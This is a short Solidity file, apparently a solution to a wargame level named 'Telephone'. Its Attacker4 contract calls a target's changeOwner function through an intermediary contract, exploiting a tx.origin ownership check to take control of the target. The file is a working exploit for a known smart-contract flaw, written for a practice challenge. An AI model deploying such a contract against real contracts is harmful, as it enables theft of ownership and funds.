// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

abstract contract Telephone {
    function changeOwner(address _owner) public virtual;
}

contract Attacker4 {
    function attack(address targetAddr) external {
        Telephone(targetAddr).changeOwner(msg.sender);
    }
}
